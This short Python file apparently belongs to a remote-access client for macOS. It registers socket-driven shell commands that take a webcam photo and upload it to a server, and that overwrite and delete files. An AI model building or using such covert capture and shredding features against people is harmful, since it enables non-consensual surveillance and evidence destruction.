from client.commands.platform.services.mac.file_inspection_service import MacFileInspectionService
from client.commands.platform.services.mac.media_service import MacMediaService
from client.commands.shell.decorators import shell_command


class MacShellCommands:
    """macOS Shell commands."""

    def __init__(self, socket):
        super().__init__(socket)
        self.mac_media = MacMediaService(self)
        self.mac_file_inspection = MacFileInspectionService(self)

    @shell_command('Capture webcam photo', group='media', output='stream')
    def webcam_snap(self):
        """拍照并上传到服务器"""
        return self.mac_media.capture_webcam_photo()

    @shell_command('Securely delete file (overwrite)', group='file', output='stream')
    def file_shred(self, path):
        """安全删除文件（覆写后删除）"""
        return self.mac_file_inspection.secure_delete_file(path)
